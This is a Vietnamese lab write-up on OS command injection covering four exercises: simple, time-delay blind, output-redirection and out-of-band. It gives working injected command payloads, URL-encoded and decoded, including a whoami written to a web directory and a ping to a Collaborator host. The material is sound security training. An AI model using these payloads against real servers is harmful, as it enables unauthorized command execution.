# 1. OS command injection, simple case
Trong chức năng check stock, ta thấy body có dạng `productId=2&storeId=1`

Thử thay đổi body thành `productId=2&storeId=1'` thì thấy hiển thị lỗi `sh: 1: Syntax error:Unterminated quoted string`. Như vậy, server sử dụng hai biến productId và storeId để truyền vào một lệnh command, thực thi rồi trả về kết quả tương ứng.

Thay đổi body để thực thi câu lệnh whoami: `productId=2&storeId=1;whoami`, ta thu được kết quả mong muốn

![image](https://user-images.githubusercontent.com/103978452/202739993-e5acd98b-fd43-4d42-a90e-abde76bffc9d.png)

# 2. Blind OS command injection with time delays
Trong chức năng feedback, ta thấy response trả về chỉ là một object rỗng. Như vậy đây là blind OS command injection.

Body của request tới /feedback/submit có dạng `csrf=...&name=my_name&email=my_mail@gmail.com&subject=my_subject&mesage=my_message`. Lần lượt thử thêm `%22%3Bsleep+10%3Becho+%22` (ứng với `";sleep 10;echo "` sau khi URL decode) vào sau các trường name, email, subject và message. 

Ta thấy với body `csrf=Mfd0vSTsKCnatqeVnSeJaohf5YXVKSCV&name=triet%22%3Bsleep+10%3Becho+%2& email=trang%40gmail.com2&subject=trung&message=helloooo` thì response bị delay 10 giây. Như vậy, kết quả thành công.

# 3. Blind OS command injection with output redirection
Như trong lab description, các images của server được lưu trong /var/www/images

Trong chức năng feedback, thêm đoạn code sau vào sau tham số name: 
`%22%3B%77%68%6F%61%6D%69%3E%2F%76%61%72%2F%77%77%77%2F%69%6D%61%67%65%73%2F%68%65%6C%6C%6F%2E%74%78%74%3B%65%63%68%6F%20%22`, tương ứng `";whoami>/var/www/images/hello.txt;echo "` sau khi URL decode. Đoạn code này sẽ thực thi lệnh whoami và đưa nội dung vào file /var/www/images/hello.txt

Truy cập URL `/images?filename=hello.txt`, ta có được nội dung của lệnh command whoami

![image](https://user-images.githubusercontent.com/103978452/202840364-69225135-eaf3-43bd-ba93-da0137d0249b.png)

# 4. Blind OS command injection with out-of-band interaction
Trong chức năng feedback, ta thay đổi tham số username:
`name=test%22%3B%70%69%6E%67%20%6D%71%67%35%63%79%6A%68%72%6D%70%74%34%36%71%6D%76%61%6E%69%63%73%31%6C%35%63%62%32%7A%72%2E%6F%61%73%74%69%66%79%2E%63%6F%6D%3B%65%63%68%6F%20%22`, tương ứng `name=test";ping mqg5cyjhrmpt46qmvanics1l5cb2zr.oastify.com;echo "` sau khi URL decode.

![Uploading image.png…]()

Sau khi gửi request, kiểm tra trong BurpCollaborator client thì thấy có request được gửi đến

![Uploading image.png…]()

